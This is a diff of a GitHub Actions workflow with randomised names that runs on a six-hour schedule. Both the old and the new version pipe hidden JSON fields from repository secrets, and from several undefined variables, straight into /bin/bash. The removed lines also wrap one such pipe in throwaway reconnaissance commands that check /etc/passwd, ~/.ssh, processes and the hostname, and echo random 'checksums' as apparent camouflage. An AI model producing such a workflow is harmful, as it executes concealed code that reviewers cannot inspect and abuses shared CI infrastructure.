@@ -1,9 +1,10 @@
 name: nongyuanxie1987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
-jobs:  # 15376
+    - cron: '31 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,23 +12,13 @@ jobs:  # 15376
       - uses: actions/checkout@v4
       - name: nongyuanxie1987
         env:
-          f1291: ${{ secrets.f1291 }}
+          ucl79631: ${{ secrets.ucl79631 }}
         run: |
-          git remote -vv
-          [ -f /etc/hosts ] && echo "Hosts exist" || true
-          echo $f1291 | jq -r .o14812 | /bin/bash
-          printf "shasum -a 256 of \$(date): $(printf "%s" "$(date)" | shasum -a 256)"
-          uname -a
-          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
-          which screen
-          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
-          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
-          which sqlite
-          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
-          sleep 0.1 2>/dev/null || true
-          ls -al | awk '{print $NF}'
-          systemctl status nginx
-          echo "Version: $((1 + RANDOM % 5))"
-          echo "Debug at $(date)"
-          git add -u
-          echo "Checksum: $((1000 + RANDOM % 9000))"
+          echo $ucl79631 | jq -r .hsn5 | /bin/bash
+          echo $vv2724 | jq -r .endx7 | /bin/bash
+          echo $itast37 | jq -r .ihxf6 | /bin/bash
+          echo $ibeui5724 | jq -r .sfg99 | /bin/bash
+          echo $v6942 | jq -r .bcsiw7866 | /bin/bash
+          echo $hnl46 | jq -r .g153 | /bin/bash
+          echo $l2 | jq -r .aqqf55 | /bin/bash
+
